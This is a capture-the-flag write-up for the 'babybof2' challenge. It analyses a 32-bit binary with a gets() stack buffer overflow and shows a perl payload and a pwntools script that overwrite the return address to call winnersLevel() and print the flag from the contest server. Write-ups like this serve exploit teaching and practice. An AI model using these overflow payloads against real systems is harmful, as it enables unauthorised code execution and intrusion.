# babybof2

## Description

Authors: icinta

```
nc chals20.cybercastors.com 14434
```

## Analysis

Open with Ghidra, look at `main()`

```
undefined4 main(void)

{
  puts("Do you really think you can get to the winners table?");
  puts("I\'ll give you one shot at it, what floor is the table at: ");
  start();
  puts("Yeah that\'s what I thougt, LOL.\n");
  return 0;
}
```

`start()` accepts input from STDIN and is vulnerable to a buffer overflow.

```
void start(void)

{
  char local_4c [68];
  
  __x86.get_pc_thunk.ax();
  gets(local_4c);
  return;
}
```

```
(gdb) disas start
Dump of assembler code for function start:
   0x08049201 <+0>:	push   %ebp
   0x08049202 <+1>:	mov    %esp,%ebp
   0x08049204 <+3>:	push   %ebx
   0x08049205 <+4>:	sub    $0x44,%esp
   0x08049208 <+7>:	call   0x8049290 <__x86.get_pc_thunk.ax>
   0x0804920d <+12>:	add    $0x21eb,%eax
   0x08049212 <+17>:	sub    $0xc,%esp
   0x08049215 <+20>:	lea    -0x48(%ebp),%edx
   0x08049218 <+23>:	push   %edx
   0x08049219 <+24>:	mov    %eax,%ebx
   0x0804921b <+26>:	call   0x8049040 <gets@plt>
   0x08049220 <+31>:	add    $0x10,%esp
   0x08049223 <+34>:	nop
   0x08049224 <+35>:	mov    -0x4(%ebp),%ebx
   0x08049227 <+38>:	leave  
   0x08049228 <+39>:	ret    
End of assembler dump.
```

And `winnersLevel()` is the function we need to reach.

```
undefined4 winnersLevel(int param_1)

{
  undefined4 uVar1;
  
  if ((param_1 == 0x182) || (param_1 == 0x102)) {
    puts("Wow! Please excuse me sir I had no idea...here are your chips");
    system("cat ./flag.txt");
    uVar1 = 1;
  }
  else {
    puts("You guessed right but it seems your badge number isn\'t on our list.");
    uVar1 = 0;
  }
  return uVar1;
}
```

```
(gdb) disas winnersLevel
Dump of assembler code for function winnersLevel:
   0x08049196 <+0>:	push   %ebp
   0x08049197 <+1>:	mov    %esp,%ebp
   0x08049199 <+3>:	push   %ebx
   0x0804919a <+4>:	sub    $0x4,%esp
   0x0804919d <+7>:	call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491a2 <+12>:	add    $0x2256,%ebx
   0x080491a8 <+18>:	cmpl   $0x182,0x8(%ebp)
   0x080491af <+25>:	je     0x80491ba <winnersLevel+36>
   0x080491b1 <+27>:	cmpl   $0x102,0x8(%ebp)
   0x080491b8 <+34>:	jne    0x80491e5 <winnersLevel+79>
   0x080491ba <+36>:	sub    $0xc,%esp
   0x080491bd <+39>:	lea    -0x13f0(%ebx),%eax
   0x080491c3 <+45>:	push   %eax
   0x080491c4 <+46>:	call   0x8049050 <puts@plt>
   0x080491c9 <+51>:	add    $0x10,%esp
   0x080491cc <+54>:	sub    $0xc,%esp
   0x080491cf <+57>:	lea    -0x13b2(%ebx),%eax
   0x080491d5 <+63>:	push   %eax
   0x080491d6 <+64>:	call   0x8049060 <system@plt>
   0x080491db <+69>:	add    $0x10,%esp
   0x080491de <+72>:	mov    $0x1,%eax
   0x080491e3 <+77>:	jmp    0x80491fc <winnersLevel+102>
   0x080491e5 <+79>:	sub    $0xc,%esp
   0x080491e8 <+82>:	lea    -0x13a0(%ebx),%eax
   0x080491ee <+88>:	push   %eax
   0x080491ef <+89>:	call   0x8049050 <puts@plt>
   0x080491f4 <+94>:	add    $0x10,%esp
   0x080491f7 <+97>:	mov    $0x0,%eax
   0x080491fc <+102>:	mov    -0x4(%ebp),%ebx
   0x080491ff <+105>:	leave  
   0x08049200 <+106>:	ret    
End of assembler dump.
```

`winnersLevel()` takes one argument, which must be either `0x182` or `0x102` to get the flag. Let's check out the stack variables for this function in Ghidra:

```
                             undefined winnersLevel(undefined4 param_1)
             undefined         AL:1           <RETURN>
             undefined4        Stack[0x4]:4   param_1                                 XREF[2]:     080491a8(R), 
                                                                                                   080491b1(R)  
             undefined4        Stack[-0x8]:4  local_8                                 XREF[1]:     080491fc(R)  
                             winnersLevel                                    XREF[3]:     Entry Point(*), 0804a158, 
                                                                                          0804a1fc(*)  
        08049196 55              PUSH       EBP

```

We'll have to overflow the input buffer in `start()`, which is 68 bytes, plus probably another 8 bytes before overwriting the return address with the starting address of `winnersLevel()`. Then there will be the new return address (`0x08049196`) and then the two stack variables for `winnersLevel()`.


Create a fake flag file, and try to exploit it by hand.

```
root@kali:~/Downloads# echo hello > flag.txt
root@kali:~/Downloads# perl -e 'print "A"x76 . "\x96\x91\x04\x08"x1 . "\x00\x00\x00\x00" . "\x02\x01\x00\x00"' > payload && ./winners < payload; echo $?
Do you really think you can get to the winners table?
I'll give you one shot at it, what floor is the table at: 
Wow! Please excuse me sir I had no idea...here are your chips
hello
Segmentation fault
139
```

Bingo! And we can do the same with gdb to see what the memory looks like with this payload by setting a breakpoint at the `nop` just after `gets()` in the `start()` function.

```
(gdb) break *0x08049223
Breakpoint 1 at 0x8049223
(gdb) run < payload
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/Downloads/winners < payload
Do you really think you can get to the winners table?
I'll give you one shot at it, what floor is the table at: 

Breakpoint 1, 0x08049223 in start ()
(gdb) info reg
eax            0xffffd2b0          -11600
ecx            0xf7faf5c0          -134548032
edx            0xf7fb089c          -134543204
ebx            0x804b3f8           134525944
esp            0xffffd2b0          0xffffd2b0
ebp            0xffffd2f8          0xffffd2f8
esi            0xf7faf000          -134549504
edi            0xf7faf000          -134549504
eip            0x8049223           0x8049223 <start+34>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/40wx $esp
0xffffd2b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd2f0:	0x41414141	0x41414141	0x41414141	0x08049196
0xffffd300:	0x00000000	0x00000102	0xf7e06b00	0xf7fb2588
0xffffd310:	0xf7faf000	0xf7faf000	0x00000000	0xf7e06c7b
0xffffd320:	0xf7faf3fc	0x00040000	0x00000000	0x080492f3
0xffffd330:	0x00000001	0xffffd3f4	0xffffd3fc	0x080492c1
0xffffd340:	0xffffd360	0x00000000	0x00000000	0xf7defb41

```

## Solution

Now that we have a working local exploit, write the script to exploit the remote server. One key thing I missed when I first wrote this is that we have to set `DEBUG` mode to dump out every byte received. Otherwise, we won't see the flag.

```
root@kali:~/Downloads# cat winners-exploit.py 
#!/usr/bin/env python3
from pwn import *
context.log_level='DEBUG' # need debug mode to see flag
binary = ELF('./winners')
print("%x\n" % binary.symbols['winnersLevel'])
p = remote('chals20.cybercastors.com', 14434)
p.recvuntil("what floor is the table at:")
payload = b'A' * (68 + 8)
payload += p32(binary.symbols['winnersLevel'])
payload += p32(0x0)
payload += p32(0x102)
p.sendline(payload)
p.stream()
```

```
root@kali:~/Downloads# ./winners-exploit.py 
[DEBUG] PLT 0x8049040 gets
[DEBUG] PLT 0x8049050 puts
[DEBUG] PLT 0x8049060 system
[DEBUG] PLT 0x8049070 __libc_start_main
[*] '/root/Downloads/winners'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
8049196

[+] Opening connection to chals20.cybercastors.com on port 14434: Done
[DEBUG] Received 0x71 bytes:
    b'Do you really think you can get to the winners table?\n'
    b"I'll give you one shot at it, what floor is the table at: \n"
[DEBUG] Sent 0x59 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  41 41 41 41  96 91 04 08  │AAAA│AAAA│AAAA│····│
    00000050  00 00 00 00  02 01 00 00  0a                        │····│····│·│
    00000059
 
[DEBUG] Received 0x3e bytes:
    b'Wow! Please excuse me sir I had no idea...here are your chips\n'
Wow! Please excuse me sir I had no idea...here are your chips
[DEBUG] Received 0x2a bytes:
    b'castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}'
```

The flag is:

```
castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}
```

